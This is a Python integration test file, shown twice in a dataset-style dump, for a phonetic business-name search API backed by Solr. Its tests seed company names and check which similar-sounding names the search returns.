'KAIZEN'}, ] ) @integration_synonym_api @integration_solr def test_resist_short_word(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'FE', id='1') verify_results(client, jwt, query='FA', expected=[ {'name': '----FA'} ] ) @integration_synonym_api @integration_solr def test_resist_single_vowel(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'FEDS', id='1') verify_results(client, jwt, query='FADS', expected=[ {'name': '----FADS'} ] ) @integration_synonym_api @integration_solr def test_feel(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'FEEL', id='1') verify_results(client, jwt, query='FILL', expected=[ {'name': '----FILL'} ] ) @integration_synonym_api @integration_solr def test_bear(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'BEAR', id='1') verify_results(client, jwt, query='BARE', expected=[ {'name': '----BARE'}, {'name': 'BEAR'} ] ) @integration_synonym_api @integration_solr def test_ignore_corp(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'GLADSTONE CAPITAL corp', id='1') verify_results(client, jwt, query='GOLDSMITHS', expected=[ {'name': '----GOLDSMITHS'} ] ) @integration_synonym_api @integration_solr def test_designation_in_query_is_ignored(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'FINGER LIMATED', id='1') verify_results(client, jwt, query='SUN LIMITED', expected=[ {'name': '----SUN'} ] ) @integration_synonym_api @integration_solr def leak(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'LEAK', id='1') verify_results(client, jwt, query='LEEK', expected=[ {'name': 'LEAK'} ] ) @integration_synonym_api @integration_solr def test_plank(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'PLANCK', id='1') verify_results(client, jwt, query='PLANK', expected=[ {'name': '----PLANK'}, {'name': 'PLANCK'} ] ) @integration_synonym_api @integration_solr def test_krystal(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KRYSTAL', id='1') verify_results(client, jwt, query='CRISTAL', expected=[ {'name': '----CRISTAL'}, {'name': 'KRYSTAL'} ] ) @integration_synonym_api @integration_solr def test_christal(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KRYSTAL', id='1') verify_results(client, jwt, query='CHRISTAL', expected=[ {'name': '----CHRISTAL'}, {'name': 'KRYSTAL'} ] ) @integration_synonym_api @integration_solr def test_kl(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KLASS', id='1') verify_results(client, jwt, query='CLASS', expected=[ {'name': '----CLASS'}, {'name': 'KLASS'} ] ) @integration_synonym_api @integration_solr def test_pheel(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'PHEEL', id='1') verify_results(client, jwt, query='FEEL', expected=[ {'name': '----FEEL'}, {'name': 'PHEEL'} ] ) @integration_synonym_api @integration_solr def test_ghable(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'GHABLE', id='1') verify_results(client, jwt, query='GABLE', expected=[ {'name': '----GABLE'}, {'name': 'GHABLE'} ] ) @integration_synonym_api @integration_solr def test_gnat(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'GNAT', id='1') verify_results(client, jwt, query='NAT', expected=[ {'name': '----NAT'}, {'name': 'GNAT'} ] ) @integration_synonym_api @integration_solr def test_kn(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KNAT', id='1') verify_results(client, jwt, query='NAT', expected=[ {'name': '----NAT'}, {'name': 'KNAT'} ] ) @integration_synonym_api @integration_solr def test_pn(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'PNEU', id='1') verify_results(client, jwt, query='NEU', expected=[ {'name': '----NEU'}, {'name': 'PNEU'} ] ) @integration_synonym_api @integration_solr def test_wr(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'WREN', id='1') verify_results(client, jwt, query='REN', expected=[ {'name': '----REN'}, {'name': 'WREN'} ] ) @integration_synonym_api @integration_solr def test_rh(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'RHEN', id='1') verify_results(client, jwt, query='REN', expected=[ {'name': '----REN'}, {'name': 'RHEN'} ] ) @integration_synonym_api @integration_solr def test_soft_c_is_not_k(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KIRK', id='1') verify_results(client, jwt, query='CIRCLE', expected=[ {'name': '----CIRCLE'} ] ) @integration_synonym_api @integration_solr def test_oi_oy(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'OYSTER', id='1') verify_results(client, jwt, query='OISTER', expected=[ {'name': '----OISTER'}, {'name': 'OYSTER'} ] ) @integration_synonym_api @integration_solr def test_dont_add_match_twice(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'RHEN GNAT', id='1') verify_results(client, jwt, query='REN NAT', expected=[ {'name': '----REN NAT'}, {'name': 'RHEN GNAT'}, {'name': '----REN'} ] ) @integration_synonym_api @integration_solr def test_neighbour(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'NEIGHBOUR', id='1') verify_results(client, jwt, query='NAYBOR', expected=[ {'name': '----NAYBOR'}, {'name': 'NEIGHBOUR'} ] ) @integration_synonym_api @integration_solr def test_mac_mc(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'MCGREGOR', id='1') verify_results(client, jwt, query='MACGREGOR', expected=[ {'name': '----MACGREGOR'}, {'name': 'MCGREGOR'} ] ) @integration_synonym_api @integration_solr def test_ex_x(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'EXTREME', id='1') verify_results(client, jwt, query='XTREME', expected=[ {'name': '----XTREME'}, {'name': 'EXTREME'} ] ) @integration_synonym_api @integration_solr def test_wh(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'WHITE', id='1') verify_results(client, jwt, query='WITE', expected=[ {'name': '----WITE'}, {'name': 'WHITE'} ] ) @integration_synonym_api @integration_solr def test_qu(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KWIK', id='1') verify_results(client, jwt, query='QUICK', expected=[ {'name': '----QUICK'}, {'name': 'KWIK'} ] ) @integration_synonym_api @integration_solr def test_ps(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'PSYCHO', id='1') verify_results(client, jwt, query='SYCHO', expected=[ {'name': '----SYCHO'}, {'name': 'PSYCHO'} ] ) @pytest.mark.skip(reason=\"not handled yet\") @integration_synonym_api @integration_solr def test_terra(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'TERRA', id='1') verify_results(client, jwt, query='TARA', expected=[ {'name': 'TERRA'} ] ) @integration_synonym_api @integration_solr def test_ayaan(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'AYAAN', id='1') verify_results(client, jwt, query='AYAN', expected=[ {'name': '----AYAN'}, {'name': 'AYAAN'} ] ) @integration_synonym_api @integration_solr def test_aggri(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'AGGRI', id='1') verify_results(client, jwt, query='AGRI', expected=[ {'name': '----AGRI'}, {'name': 'AGGRI'} ] ) @integration_synonym_api @integration_solr def test_kofi(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'KOFI', id='1') verify_results(client, jwt, query='COFFI', expected=[ {'name': '----COFFI'}, {'name': 'KOFI'} ] ) @integration_synonym_api @integration_solr def test_tru(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'TRU', id='1') verify_results(client, jwt, query='TRUE', expected=[ {'name': '----TRUE'}, {'name': 'TRU'} ] ) @pytest.mark.skip(reason=\"not handled yet\") @integration_synonym_api @integration_solr def test_dymond(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'DYMOND', id='1') verify_results(client, jwt, query='DIAMOND', expected=[ {'name': 'DYMOND'} ] ) @pytest.mark.skip(reason=\"compound words not handled yet\") @integration_synonym_api @integration_solr def test_bee_kleen(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'BEE KLEEN', id='1') verify_results(client, jwt, query='BE-CLEAN', expected=[ {'name': 'BEE KLEEN'} ] ) @integration_synonym_api @integration_solr def test_ignore_exact_match_keep_phonetic(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'BODY BLUEPRINT FITNESS INC.', id='1') seed_database_with(solr, 'BLUEPRINT BEAUTEE', id='2') verify_results(client, jwt, query='BLUEPRINT BEAUTY', expected=[ {'name': '----BLUEPRINT BEAUTY'}, {'name': 'BLUEPRINT BEAUTEE'}, {'name': '----BLUEPRINT synonyms:(BEAUTI)'} ] ) @integration_synonym_api @integration_solr def test_match_both_words(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'ANDERSON BEHAVIOR CONSULTING', id='1') verify_results(client, jwt, query='INTERVENTION BEHAVIOUR', expected=[ {'name': '----INTERVENTION BEHAVIOUR'}, {'name': '----INTERVENTION'} ] ) @integration_synonym_api @integration_solr def test_match_at_right_level(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'ANDERSON BEHAVIOR CONSULTING INC.', id='1') verify_results(client, jwt, query='BEHAVIOUR INTERVENTION', expected=[ {'name': '----BEHAVIOUR INTERVENTION'}, {'name': '----BEHAVIOUR'}, {'name': 'ANDERSON BEHAVIOR CONSULTING INC.'} ] ) @integration_synonym_api @integration_solr def test_resists_qword_matching_several_words(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'ANDERSON BEHAVIOR BEHAVIOR', id='1') verify_results(client, jwt, query='BEHAVIOUR INTERVENTION', expected=[ {'name': '----BEHAVIOUR INTERVENTION'}, {'name': '----BEHAVIOUR'}, {'name': 'ANDERSON BEHAVIOR BEHAVIOR'} ] ) @integration_synonym_api @integration_solr def test_leading_vowel_a(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'AILEEN ENTERPRISES', id='1') verify_results(client, jwt, query='ALAN HARGREAVES CORPORATION', expected=[ {'name': '----ALAN HARGREAVES'}, {'name': '----ALAN'} ] ) @integration_synonym_api @integration_solr def test_leading_vowel_e(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'ACME', id='1') verify_results(client, jwt, query='EQUIOM', expected=[ {'name': '----EQUIOM'} ] ) @integration_synonym_api @integration_solr def test_leading_vowel_not_match_consonant(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'HELENAH WU & CO. INC.', id='1') seed_database_with(solr, 'A BETTER WAY HERBALS LTD.', id='2') verify_results(client, jwt, query='EH', expected=[ {'name': '----EH'} ] ) @integration_synonym_api @integration_solr def test_unusual_result(solr, client, jwt, app): clean_database(solr) seed_database_with(solr, 'DOUBLE J AVIATION LTD.', id='1') verify_results(client, jwt, query='TABLE', expected=[ {'name': '----TABLE'} ] ) @integration_synonym_api @integration_solr def test_stack_ignores_wildcards(client, jwt, app): verify_results(client, jwt, query=\"TESTING* @WILDCARDS\", expected=[ {'name': '----TESTING WILDCARDS'}, {'name': '----TESTING'} ] ) @integration_synonym_api @integration_solr @pytest.mark.parametrize(\"query\",[ ('T.H.E.'), ('COMPANY'), ('ASSN'), ('THAT'), ('LIMITED CORP.'), ]) def test_query_stripped_to_empty_string(solr,client, jwt, query): clean_database(solr) seed_database_with(solr, 'JM Van Damme inc', id='1') seed_database_with(solr, 'SOME RANDOM NAME', id='2') verify_results(client, jwt, query=query, expected=[{'name':'----*'}] ) ", "sourceWithComments": "from namex.models import User\nimport requests\nimport json\nimport pytest\nfrom tests.python import integration_solr, integration_synonym_api\nimport urllib\nfrom hamcrest import *\n\n\ntoken_header = {\n                \"alg\": \"RS256\",\n                \"typ\": \"JWT\",\n                \"kid\": \"flask-jwt-oidc-test-client\"\n               }\nclaims = {\n            \"iss\": \"https://sso-dev.pathfinder.gov.bc.ca/auth/realms/sbc\",\n            \"sub\": \"43e6a245-0bf7-4ccf-9bd0-e7fb85fd18cc\",\n            \"aud\": \"NameX-Dev\",\n            \"exp\": 31531718745,\n            \"iat\": 1531718745,\n            \"jti\": \"flask-jwt-oidc-test-support\",\n            \"typ\": \"Bearer\",\n            \"username\": \"test-user\",\n            \"realm_access\": {\n                \"roles\": [\n                    \"{}\".format(User.EDITOR),\n                    \"{}\".format(User.APPROVER),\n                    \"viewer\",\n                    \"user\"\n                ]\n            }\n         }\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef reload_schema(solr):\n    url = solr + '/solr/admin/cores?action=RELOAD&core=possible.conflicts&wt=json'\n    r = requests.get(url)\n\n    assert r.status_code == 200\n\n\n@integration_solr\ndef test_solr_available(solr, app, client, jwt):\n    url = solr + '/solr/possible.conflicts/admin/ping'\n    r = requests.get(url)\n\n    assert r.status_code == 200\n\n\ndef clean_database(solr):\n    url = solr + '/solr/possible.conflicts/update?commit=true'\n    headers = {'content-type': 'text/xml'}\n    data = '<delete><query>id:*</query></delete>'\n    r = requests.post(url, headers=headers, data=data)\n\n    assert r.status_code == 200\n\n\ndef seed_database_with(solr, name, id='1', source='CORP'):\n    url = solr + '/solr/possible.conflicts/update?commit=true'\n    headers = {'content-type': 'application/json'}\n    data = '[{\"source\":\"' + source + '\", \"name\":\"' + name + '\", \"id\":\"'+ id +'\"}]'\n    r = requests.post(url, headers=headers, data=data)\n\n    assert r.status_code == 200\n\n\ndef verify(data, expected):\n\n    print(\"Expected: \", expected)\n\n    # remove the search divider(s): ----<query term>\n    actual = [{ 'name':doc['name_info']['name'] } for doc in data['names']]\n\n    print(\"Actual: \", actual)\n\n    assert_that(len(actual), equal_to(len(expected)))\n    for i in range(len(actual)):\n        assert_that(actual[i]['name'], equal_to(expected[i]['name']))\n\n\ndef verify_results(client, jwt, query, expected):\n    data = search(client, jwt, query)\n    verify(data, expected)\n\n\ndef search(client, jwt, query):\n    token = jwt.create_jwt(claims, token_header)\n    headers = {'Authorization': 'Bearer ' + token}\n    url = '/api/v1/requests/phonetics/' + urllib.parse.quote(query) + '/*'\n    print(url)\n    rv = client.get(url, headers=headers)\n\n    assert rv.status_code == 200\n    return json.loads(rv.data)\n\n\n@integration_synonym_api\n@integration_solr\ndef test_all_good(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'GOLDSTREAM ELECTRICAL LTD')\n    verify_results(client, jwt,\n       query='GOLDSMITHS',\n       expected=[\n           {'name': '----GOLDSMITHS'},\n           {'name': 'GOLDSTREAM ELECTRICAL LTD'}\n       ]\n    )\n\n\n@pytest.mark.skip(reason=\"Rhyming not implemented yet\")\n@integration_synonym_api\n@integration_solr\ndef test_sounds_like(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'GAYLEDESIGNS INC.', id='1')\n    seed_database_with(solr, 'GOLDSTREAM ELECTRICAL CORP', id='2')\n    seed_database_with(solr, 'GLADSTONE JEWELLERY LTD', id='3')\n    seed_database_with(solr, 'GOLDSTEIN HOLDINGS INC.', id='4')\n    seed_database_with(solr, 'CLOUDSIDE INN INCORPORATED', id='5')\n    seed_database_with(solr, 'GOLDSPRING PROPERTIES LTD', id='6')\n    seed_database_with(solr, 'GOLDSTRIPES AVIATION INC', id='7')\n    seed_database_with(solr, 'GLADSTONE CAPITAL CORP', id='8')\n    seed_database_with(solr, 'KLETAS LAW CORPORATION', id='9')\n    seed_database_with(solr, 'COLDSTREAM VENTURES INC.', id='10')\n    seed_database_with(solr, 'BLABLA ANYTHING', id='11')\n    verify_results(client, jwt,\n       query='GOLDSMITHS',\n       expected=[\n           {'name': '----GOLDSMITHS'},\n           {'name': 'COLDSTREAM VENTURES INC.'},\n           {'name': 'GOLDSPRING PROPERTIES LTD'},\n           {'name': 'GOLDSTEIN HOLDINGS INC.'},\n           {'name': 'GOLDSTREAM ELECTRICAL CORP'},\n           {'name': 'GOLDSTRIPES AVIATION INC'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_liberti(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'LIBERTI', id='1')\n    verify_results(client, jwt,\n       query='LIBERTY',\n       expected=[\n           {'name': '----LIBERTY'},\n           {'name': 'LIBERTI'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_deeper(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'LABORATORY', id='1')\n    seed_database_with(solr, 'LAPORTE', id='2')\n    seed_database_with(solr, 'LIBERTI', id='3')\n    verify_results(client, jwt,\n       query='LIBERTY',\n       expected=[\n           {'name': '----LIBERTY'},\n           {'name': 'LIBERTI'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_jasmine(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'JASMINE', id='1')\n    verify_results(client, jwt,\n       query='OSMOND',\n       expected=[\n           {'name': '----OSMOND'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_fey(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'FEY', id='1')\n    verify_results(client, jwt,\n       query='FAY',\n       expected=[\n           {'name': '----FAY'},\n           {'name': 'FEY'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_venizia(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'VENIZIA', id='1')\n    seed_database_with(solr, 'VENEZIA', id='2')\n    seed_database_with(solr, 'VANSEA', id='3')\n    seed_database_with(solr, 'WENSO', id='4')\n    verify_results(client, jwt,\n       query='VENIZIA',\n       expected=[\n           {'name': '----VENIZIA'},\n           {'name': 'VENEZIA'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ys_and_is(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'CRYSTAL', id='1')\n    verify_results(client, jwt,\n       query='CRISTAL',\n       expected=[\n           {'name': '----CRISTAL'},\n           {'name': 'CRYSTAL'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_cs_and_ks(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KOLDSMITHS', id='1')\n    verify_results(client, jwt,\n       query='COLDSTREAM',\n       expected=[\n           {'name': '----COLDSTREAM'},\n           {'name': 'KOLDSMITHS'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_cs_and_ks_again(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'CRAZY', id='1')\n    seed_database_with(solr, 'KAIZEN', id='2')\n    verify_results(client, jwt,\n       query='CAYZEN',\n       expected=[\n           {'name': '----CAYZEN'},\n           {'name': 'KAIZEN'},\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_resist_short_word(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'FE', id='1')\n    verify_results(client, jwt,\n       query='FA',\n       expected=[\n           {'name': '----FA'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_resist_single_vowel(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'FEDS', id='1')\n    verify_results(client, jwt,\n       query='FADS',\n       expected=[\n           {'name': '----FADS'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_feel(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'FEEL', id='1')\n    verify_results(client, jwt,\n       query='FILL',\n       expected=[\n           {'name': '----FILL'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_bear(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'BEAR', id='1')\n    verify_results(client, jwt,\n       query='BARE',\n       expected=[\n           {'name': '----BARE'},\n           {'name': 'BEAR'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ignore_corp(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'GLADSTONE CAPITAL corp', id='1')\n    verify_results(client, jwt,\n       query='GOLDSMITHS',\n       expected=[\n           {'name': '----GOLDSMITHS'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_designation_in_query_is_ignored(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'FINGER LIMATED', id='1')\n    verify_results(client, jwt,\n       query='SUN LIMITED',\n       expected=[\n           {'name': '----SUN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef leak(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'LEAK', id='1')\n    verify_results(client, jwt,\n       query='LEEK',\n       expected=[\n           {'name': 'LEAK'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_plank(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'PLANCK', id='1')\n    verify_results(client, jwt,\n       query='PLANK',\n       expected=[\n           {'name': '----PLANK'},\n           {'name': 'PLANCK'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_krystal(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KRYSTAL', id='1')\n    verify_results(client, jwt,\n       query='CRISTAL',\n       expected=[\n           {'name': '----CRISTAL'},\n           {'name': 'KRYSTAL'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_christal(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KRYSTAL', id='1')\n    verify_results(client, jwt,\n       query='CHRISTAL',\n       expected=[\n           {'name': '----CHRISTAL'},\n           {'name': 'KRYSTAL'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_kl(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KLASS', id='1')\n    verify_results(client, jwt,\n       query='CLASS',\n       expected=[\n           {'name': '----CLASS'},\n           {'name': 'KLASS'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_pheel(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'PHEEL', id='1')\n    verify_results(client, jwt,\n       query='FEEL',\n       expected=[\n           {'name': '----FEEL'},\n           {'name': 'PHEEL'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ghable(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'GHABLE', id='1')\n    verify_results(client, jwt,\n       query='GABLE',\n       expected=[\n           {'name': '----GABLE'},\n           {'name': 'GHABLE'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_gnat(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'GNAT', id='1')\n    verify_results(client, jwt,\n       query='NAT',\n       expected=[\n           {'name': '----NAT'},\n           {'name': 'GNAT'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_kn(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KNAT', id='1')\n    verify_results(client, jwt,\n       query='NAT',\n       expected=[\n           {'name': '----NAT'},\n           {'name': 'KNAT'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_pn(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'PNEU', id='1')\n    verify_results(client, jwt,\n       query='NEU',\n       expected=[\n           {'name': '----NEU'},\n           {'name': 'PNEU'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_wr(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'WREN', id='1')\n    verify_results(client, jwt,\n       query='REN',\n       expected=[\n           {'name': '----REN'},\n           {'name': 'WREN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_rh(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'RHEN', id='1')\n    verify_results(client, jwt,\n       query='REN',\n       expected=[\n           {'name': '----REN'},\n           {'name': 'RHEN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_soft_c_is_not_k(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KIRK', id='1')\n    verify_results(client, jwt,\n       query='CIRCLE',\n       expected=[\n           {'name': '----CIRCLE'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_oi_oy(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'OYSTER', id='1')\n    verify_results(client, jwt,\n       query='OISTER',\n       expected=[\n           {'name': '----OISTER'},\n           {'name': 'OYSTER'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_dont_add_match_twice(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'RHEN GNAT', id='1')\n    verify_results(client, jwt,\n       query='REN NAT',\n       expected=[\n           {'name': '----REN NAT'},\n           {'name': 'RHEN GNAT'},\n           {'name': '----REN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_neighbour(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'NEIGHBOUR', id='1')\n    verify_results(client, jwt,\n       query='NAYBOR',\n       expected=[\n           {'name': '----NAYBOR'},\n           {'name': 'NEIGHBOUR'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_mac_mc(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'MCGREGOR', id='1')\n    verify_results(client, jwt,\n       query='MACGREGOR',\n       expected=[\n           {'name': '----MACGREGOR'},\n           {'name': 'MCGREGOR'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ex_x(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'EXTREME', id='1')\n    verify_results(client, jwt,\n       query='XTREME',\n       expected=[\n           {'name': '----XTREME'},\n           {'name': 'EXTREME'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_wh(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'WHITE', id='1')\n    verify_results(client, jwt,\n       query='WITE',\n       expected=[\n           {'name': '----WITE'},\n           {'name': 'WHITE'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_qu(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KWIK', id='1')\n    verify_results(client, jwt,\n       query='QUICK',\n       expected=[\n           {'name': '----QUICK'},\n           {'name': 'KWIK'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ps(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'PSYCHO', id='1')\n    verify_results(client, jwt,\n       query='SYCHO',\n       expected=[\n           {'name': '----SYCHO'},\n           {'name': 'PSYCHO'}\n       ]\n    )\n\n\n@pytest.mark.skip(reason=\"not handled yet\")\n@integration_synonym_api\n@integration_solr\ndef test_terra(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'TERRA', id='1')\n    verify_results(client, jwt,\n       query='TARA',\n       expected=[\n           {'name': 'TERRA'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ayaan(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'AYAAN', id='1')\n    verify_results(client, jwt,\n       query='AYAN',\n       expected=[\n           {'name': '----AYAN'},\n           {'name': 'AYAAN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_aggri(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'AGGRI', id='1')\n    verify_results(client, jwt,\n       query='AGRI',\n       expected=[\n           {'name': '----AGRI'},\n           {'name': 'AGGRI'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_kofi(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'KOFI', id='1')\n    verify_results(client, jwt,\n       query='COFFI',\n       expected=[\n           {'name': '----COFFI'},\n           {'name': 'KOFI'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_tru(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'TRU', id='1')\n    verify_results(client, jwt,\n       query='TRUE',\n       expected=[\n           {'name': '----TRUE'},\n           {'name': 'TRU'}\n       ]\n    )\n\n\n@pytest.mark.skip(reason=\"not handled yet\")\n@integration_synonym_api\n@integration_solr\ndef test_dymond(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'DYMOND', id='1')\n    verify_results(client, jwt,\n       query='DIAMOND',\n       expected=[\n           {'name': 'DYMOND'}\n       ]\n    )\n\n\n@pytest.mark.skip(reason=\"compound words not handled yet\")\n@integration_synonym_api\n@integration_solr\ndef test_bee_kleen(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'BEE KLEEN', id='1')\n    verify_results(client, jwt,\n       query='BE-CLEAN',\n       expected=[\n           {'name': 'BEE KLEEN'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_ignore_exact_match_keep_phonetic(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'BODY BLUEPRINT FITNESS INC.', id='1')\n    seed_database_with(solr, 'BLUEPRINT BEAUTEE', id='2')\n    verify_results(client, jwt,\n       query='BLUEPRINT BEAUTY',\n       expected=[\n           {'name': '----BLUEPRINT BEAUTY'},\n           {'name': 'BLUEPRINT BEAUTEE'},\n           {'name': '----BLUEPRINT synonyms:(BEAUTI)'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_match_both_words(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'ANDERSON BEHAVIOR CONSULTING', id='1')\n    verify_results(client, jwt,\n       query='INTERVENTION BEHAVIOUR',\n       expected=[\n           {'name': '----INTERVENTION BEHAVIOUR'},\n           {'name': '----INTERVENTION'}\n       ]\n    )\n\n\n@integration_synonym_api\n@integration_solr\ndef test_match_at_right_level(solr, client, jwt, app):\n    clean_database(solr)\n    seed_database_with(solr, 'ANDERSON BEHAVIOR CONSULTING INC.', id='1')\n    verify_results(client, jwt,\n       query='BEHAVIOUR INTERVENTION',\n       expected=[\n           {'name': '----BEHAVIOUR INTERVENTION'},\n           {'name': 